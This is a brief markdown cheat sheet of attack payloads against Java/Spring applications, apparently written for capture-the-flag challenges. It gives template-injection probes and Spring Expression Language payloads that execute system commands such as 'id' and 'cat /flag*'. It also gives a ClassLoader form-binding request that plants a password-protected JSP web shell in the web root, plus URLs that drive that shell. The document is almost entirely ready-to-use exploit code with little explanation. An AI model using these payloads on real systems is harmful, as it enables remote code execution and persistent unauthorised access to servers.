# Java / Spring

## SpEL Probe

```text
${7*7}
#{7*7}
*{7*7}
```

## SpEL RCE

```text
${T(java.lang.Runtime).getRuntime().exec('id')}
${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('cat /flag*').getInputStream()).useDelimiter('\\A').next()}
```

## Spring ClassLoader JSP Drop

Use when request parameters bind into Spring/Tomcat internals.

```http
POST /
Content-Type: application/x-www-form-urlencoded

class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di+if("x".equals(request.getParameter("pwd")))%7Bout.println(new+java.util.Scanner(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()).useDelimiter("\\A").next());%7D
&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell
&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

```text
/shell.jsp?pwd=x&cmd=id
/shell.jsp?pwd=x&cmd=cat+/flag*
```
